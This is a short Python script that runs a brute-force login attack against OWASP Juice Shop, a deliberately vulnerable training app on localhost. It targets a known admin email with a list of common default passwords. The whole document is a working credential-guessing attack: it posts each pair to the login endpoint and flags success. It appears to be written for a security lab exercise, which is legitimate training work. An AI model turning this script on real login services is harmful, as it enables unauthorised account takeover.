# Brute force attack for default credentials

import requests
import time

url = "http://localhost:3000/rest/user/login"


usernames = ["admin@juice-sh.op"] #this username was found in product reviews section
passwords = ["admin", "password", "1234", "123456", "letmein",
"welcome", "qwerty", "toor", "12345678", "abc123", "guest", 
"root", "changeme", "superuser", "123123", "admin123", "default", 
"1q2w3e4r", "password123", "test", "admin1234", "secret", 
"password1", "pass","admin123", "letmein123", "root123", "123", "123qwe", 
"admin@123", "1qaz2wsx", "1qazxsw2"]

def attempt_login(username, password):
    payload = {
        "email": username,
        "password": password
    }
    
    try:
        response = requests.post(url, data=payload)

        if response.status_code == 200 and "Invalid credentials" not in response.text:
            print(f"Success: {username} - {password}")
            return True
        else:
            print(f"Failed: {username} - {password}")
            return False
    except requests.RequestException as e:
        print(f"Error: {e}")
        return False

def brute_force():
    print("[*] Starting Brute Force Attack on OWASP Juice Shop Login\n")
    
    for username in usernames:
        for password in passwords:
            print(f"Trying: {username} - {password}")
            success = attempt_login(username, password)
 
            if success:
                break
            time.sleep(1) 


if __name__ == "__main__":
    brute_force()
